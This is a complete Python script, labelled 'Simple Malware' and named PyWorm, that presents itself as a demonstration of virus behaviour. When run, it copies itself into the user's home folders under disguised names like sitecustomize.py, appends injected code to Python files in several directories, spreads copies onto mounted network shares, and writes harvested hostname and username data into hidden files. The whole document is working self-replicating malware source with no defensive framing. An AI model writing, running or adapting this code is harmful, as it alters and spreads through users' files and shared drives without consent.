#!/usr/bin/env python3
"""
Simple Malware: Virus that infects Python files
This program demonstrates basic malware behavior:
1. Self-replication (copies itself)
2. File infection (appends code to other .py files)
3. Persistence (adds to startup)
4. Payload execution (creates hidden files)

Author: Created for demonstration
"""

import os
import sys
import shutil
import random
import json
from datetime import datetime

# Configuration
INFECTED_MARKER = "___VIRUS_INFECTED___"
VIRUS_NAME = "PyWorm"
VERSION = "1.0"

def get_virus_code():
    """Get the virus code to append to files"""
    return '''
# Virus infection code
if "__name__" in dir():
    VIRUS_PAYLOAD = "infected"
'''

def copy_self():
    """Copy virus to other locations"""
    print("[*] Self-replication: Copying virus...")
    
    # Target directories
    targets = [
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
    ]
    
    virus_path = os.path.abspath(__file__)
    
    for target_dir in targets:
        if os.path.exists(target_dir):
            # Copy with different name to be sneaky
            fake_names = [
                "python3",
                "python",
                "py",
                "sysconfig",
                "sitecustomize"
            ]
            fake_name = random.choice(fake_names) + ".py"
            target_path = os.path.join(target_dir, fake_name)
            
            if not os.path.exists(target_path):
                try:
                    shutil.copy2(virus_path, target_path)
                    print(f"  [+] Copied to: {target_path}")
                except Exception as e:
                    print(f"  [-] Failed: {e}")

def infect_files():
    """Infect Python files in current directory and common locations"""
    print("[*] Infection: Scanning for Python files...")
    
    # Directories to scan
    scan_dirs = [
        os.getcwd(),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Downloads"),
    ]
    
    infected_count = 0
    
    for scan_dir in scan_dirs:
        if not os.path.exists(scan_dir):
            continue
            
        for filename in os.listdir(scan_dir):
            if filename.endswith(".py"):
                filepath = os.path.join(scan_dir, filename)
                
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    # Check if already infected
                    if INFECTED_MARKER in content:
                        continue
                    
                    # Inject virus code
                    infected_content = content + f"\n{get_virus_code()}\n{INFECTED_MARKER}\n"
                    
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(infected_content)
                    
                    infected_count += 1
                    print(f"  [+] Infected: {filename}")
                    
                    # Limit infections per run
                    if infected_count >= 20:
                        break
                except Exception as e:
                    continue
    
    print(f"[*] Total files infected: {infected_count}")

def setup_persistence():
    """Add virus to startup"""
    print("[*] Persistence: Setting up auto-start...")
    
    # Create a hidden file in home directory
    home_dir = os.path.expanduser("~")
    startup_file = os.path.join(home_dir, ".virus_startup.txt")
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info = {
        "virus": VIRUS_NAME,
        "version": VERSION,
        "infected_at": timestamp,
        "status": "active"
    }
    
    try:
        with open(startup_file, 'w') as f:
            json.dump(info, f, indent=2)
        print(f"  [+] Persistence file created: {startup_file}")
    except Exception as e:
        print(f"  [-] Failed: {e}")

def execute_payload():
    """Execute malicious payload"""
    print("[*] Payload: Executing malware actions...")
    
    # Create hidden files with data
    home_dir = os.path.expanduser("~")
    
    # Collect system information
    system_info = {
        "hostname": os.popen("hostname").read().strip(),
        "username": os.popen("whoami").read().strip(),
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "os": os.name,
        "platform": sys.platform
    }
    
    # Save collected data
    data_file = os.path.join(home_dir, ".virus_data.json")
    
    try:
        with open(data_file, 'w') as f:
            json.dump(system_info, f, indent=2)
        print(f"  [+] Data collected and saved")
    except Exception as e:
        print(f"  [-] Failed to save data: {e}")
    
    # Create a hidden folder
    hidden_folder = os.path.join(home_dir, ".virus_hidden")
    try:
        os.makedirs(hidden_folder, exist_ok=True)
        print(f"  [+] Hidden folder created: {hidden_folder}")
    except Exception as e:
        print(f"  [-] Failed: {e}")

def infect_network():
    """Try to spread to network shares"""
    print("[*] Network: Attempting to spread to shared folders...")
    
    # Check for network shares (Linux/Mac)
    network_dirs = [
        "/network",
        "/mnt",
        "/Volumes"
    ]
    
    for network_dir in network_dirs:
        if os.path.exists(network_dir):
            for folder in os.listdir(network_dir):
                if not folder.startswith('.'):
                    share_path = os.path.join(network_dir, folder)
                    if os.path.isdir(share_path):
                        virus_path = os.path.abspath(__file__)
                        target_path = os.path.join(share_path, f"py{random.randint(100,999)}.py")
                        
                        try:
                            shutil.copy2(virus_path, target_path)
                            print(f"  [+] Spread to: {share_path}")
                        except:
                            pass

def main():
    """Main execution function"""
    print("=" * 50)
    print(f"  {VIRUS_NAME} v{VERSION} - Computer Virus")
    print("=" * 50)
    print()
    
    # Step 1: Copy itself
    copy_self()
    print()
    
    # Step 2: Infect files
    infect_files()
    print()
    
    # Step 3: Setup persistence
    setup_persistence()
    print()
    
    # Step 4: Execute payload
    execute_payload()
    print()
    
    # Step 5: Try network spread
    infect_network()
    print()
    
    print("=" * 50)
    print("  Infection complete!")
    print("=" * 50)

if __name__ == "__main__":
    main()
